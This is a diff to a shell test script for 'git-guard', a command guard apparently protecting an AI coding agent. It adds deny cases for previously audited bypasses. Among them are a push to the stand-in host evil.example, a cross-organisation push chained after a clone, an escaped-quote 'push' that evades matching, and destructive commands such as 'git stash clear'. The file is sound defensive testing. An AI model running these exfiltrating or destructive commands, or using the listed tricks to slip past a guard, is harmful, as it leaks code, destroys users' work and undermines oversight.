@@ -26,6 +26,15 @@ deny "git rebase main"
 deny "git branch -D feature"
 deny "git commit --amend -m x"
 deny "git send-email"
+# regressions for audited bypasses (must stay BLOCKED)
+deny "git clone https://github.com/NamHT4Devlop/x && git push https://github.com/acme-corp/secret main"
+deny "git push https://evil.example/github.com/NamHT4Devlop/x main"
+deny "git \\\"push\\\" git@github.com:acme-corp/app.git"
+deny "git branch -d -f feature"
+deny "git switch --discard-changes main"
+deny "git switch -C wip"
+deny "git stash drop"
+deny "git stash clear"
 
 echo "git-guard: ALLOW cases"
 allow "git push https://github.com/NamHT4Devlop/nam-claude-skill main"
@@ -40,6 +49,12 @@ allow "git commit -m fix-the-thing"
 allow "git checkout main"
 allow "git branch -d merged"
 allow "ls -la"
+# regressions for audited false positives (must stay ALLOWED)
+allow "git log --grep rebase"
+allow "git stash"
+allow "git stash pop"
+allow "git switch main"
+allow "git clone https://github.com/NamHT4Devlop/x && git push https://github.com/NamHT4Devlop/y main"
 
 echo "git-guard: $pass passed, $fail failed"
 [ "$fail" -eq 0 ]
